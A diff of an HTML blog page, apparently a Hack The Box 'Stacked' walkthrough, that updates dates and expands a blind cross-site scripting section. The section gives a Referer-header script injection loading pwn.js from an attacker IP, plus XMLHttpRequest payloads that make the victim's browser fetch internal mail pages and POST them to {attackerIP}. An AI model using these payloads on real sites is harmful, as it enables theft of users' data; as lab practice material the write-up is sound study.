@@ -57,7 +57,7 @@
 <meta name="twitter:site" content="@0xZEN2" />
 <meta name="twitter:creator" content="@Yuchao" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuchao"},"dateModified":"2022-03-30T22:39:58+08:00","datePublished":"2022-03-29T11:33:00+08:00","description":"recon","headline":"htb stacked","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/htb-stacked/"},"url":"/posts/htb-stacked/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuchao"},"dateModified":"2022-03-31T11:17:58+08:00","datePublished":"2022-03-29T11:33:00+08:00","description":"recon","headline":"htb stacked","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/htb-stacked/"},"url":"/posts/htb-stacked/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
@@ -663,6 +663,18 @@
       
 
     
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
 
     
 
@@ -742,7 +754,7 @@
 -->
 
 <em class="timeago"
-    data-ts="1648651198"
+    data-ts="1648696678"
     
       data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll"
     
@@ -773,8 +785,8 @@
 
 <!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="241 words">
-  <em>1 min</em> read</span>
+  title="374 words">
+  <em>2 min</em> read</span>
 
 
       <!-- page views -->
@@ -836,8 +848,30 @@ attacker machine
 </ul>
 
 <h4 id="find-out-what-the-url-the-victim-is-looking-at"><span class="mr-2">find out what the URL the victim is looking at.</span><a href="#find-out-what-the-url-the-victim-is-looking-at" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<ul>
+  <li>Burpsuite set header Referer: <script src="http://{attackerIP}/pwn.js"></script></li>
+  <li><code class="language-plaintext highlighter-rouge">python3 -m http.server 80</code> at pwn.js location, for victime to run pwn.js.</li>
+  <li>use nc to accept the victim`s response.</li>
+</ul>
 
-<p>Method 1:</p>
+<p>xmlhttprequest:</p>
+<ul>
+  <li>like background web request by browser.
+    <div class="language-javascript highlighter-rouge"><div class="code-header">
+        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">method</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="k">async</span><span class="p">)</span>
+<span class="c1">// if async = false, the script itself will not go foward, until the response. Otherwise, we will get null.</span>
+<span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">body</span><span class="p">)</span>
+<span class="c1">// body: Optional, A body of data to be sent in the XHR request.</span>
+</pre></td></tr></tbody></table></code></div>    </div>
+  </li>
+</ul>
+
+<p>Method 1:(lucky there is a referer header)</p>
 <div class="language-javascript highlighter-rouge"><div class="code-header">
         <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
@@ -847,7 +881,7 @@ attacker machine
   <li>in the victim`s referer, we can see the response is from: “/read-mail.php?id=5”</li>
 </ul>
 
-<p>Method 2(Better):</p>
+<p>Method 2: (more generic)</p>
 <div class="language-javascript highlighter-rouge"><div class="code-header">
         <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
@@ -858,21 +892,38 @@ attacker machine
 <span class="nx">exfilreq</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span> 
 </pre></td></tr></tbody></table></code></div></div>
 <ul>
-  <li>set above script as payload</li>
+  <li>set above script as pwn.js</li>
   <li>when we nc at 80, can see the victim`s current page appended.</li>
-  <li>“GET /http://mail.stacked.htb/read-mail.php?id=2 HTTP/1.1”</li>
-  <li>For victim will visit “http://{attackerIP}/http://mail.stacked.htb/read-mail.php?id=2”</li>
+  <li>in nc, we get “GET /http://mail.stacked.htb/read-mail.php?id=2 HTTP/1.1”</li>
+  <li>For victim visited “http://{attackerIP}/http://mail.stacked.htb/read-mail.php?id=2”</li>
 </ul>
 
-<p>We can even see content the victim is browsing by</p>
+<p>This step we find out the inner email host name. (mail.stacked.htb)</p>
+
+<h4 id="let-victim-visit-inner-pages-for-us"><span class="mr-2">Let victim visit inner pages for us.</span><a href="#let-victim-visit-inner-pages-for-us" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+
 <div class="language-javascript highlighter-rouge"><div class="code-header">
         <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
-</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">exfilreq</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>    
-<span class="nx">exfilreq</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://{attackerIP}:9001/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>    
-<span class="nx">exfilreq</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">.</span><span class="nx">outerHTML</span><span class="p">);</span> 
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre><span class="c1">// Make target to visit the target</span>
+<span class="kd">var</span> <span class="nx">target</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">{the address we want victim to visit}</span><span class="dl">"</span>
+<span class="kd">var</span> <span class="nx">req1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">req1</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="nx">target</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+<span class="nx">req1</span><span class="p">.</span><span class="nx">send</span><span class="p">()</span>
+<span class="kd">var</span> <span class="nx">response</span><span class="o">=</span><span class="nx">req1</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
+<span class="c1">// Send what victim saw back to us</span>
+<span class="kd">var</span> <span class="nx">req2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">req2</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://{attackerIP}:8000/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">)</span>
+<span class="nx">req2</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
 </pre></td></tr></tbody></table></code></div></div>
 
 <h2 id="localstack-vulnerability"><span class="mr-2">LocalStack vulnerability</span><a href="#localstack-vulnerability" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
